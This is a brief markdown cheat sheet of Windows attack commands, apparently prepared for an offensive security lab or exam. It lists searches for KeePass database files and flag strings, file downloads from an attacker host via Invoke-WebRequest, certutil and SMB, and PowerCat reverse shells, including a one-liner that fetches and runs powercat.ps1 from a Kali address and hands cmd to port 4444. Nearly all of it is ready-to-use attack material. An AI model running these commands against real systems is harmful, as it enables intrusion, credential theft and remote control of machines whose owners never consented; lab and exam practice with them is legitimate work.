## Find flag
```powershell


Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
dir /s /b c:\*.kdbx 

cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt -File -Recurse | Select-String -Pattern "OS{}" -List | Select-Object -ExpandProperty Path


```
## Downloading Files
```powershell
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

## PowerCat
```powershell
# 1 .
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/powercat.ps1'); powercat -c <KALI_IP> -p 4444 -e cmd"
# 2. 
# Create the malicious payload (including the script download/execution).
#  Then, use PowerShell to convert it to Base64 (on Kali, you'd use a tool like iconv and base64).
# execute on target
 powershell -EncodedCommand <BASE64_STRING_HERE>
# 3
# move entire powercat.ps1  to target
powershell -c "C:\Temp\powercat.ps1 -c <KALI_IP> -p 4444 -e cmd"
```
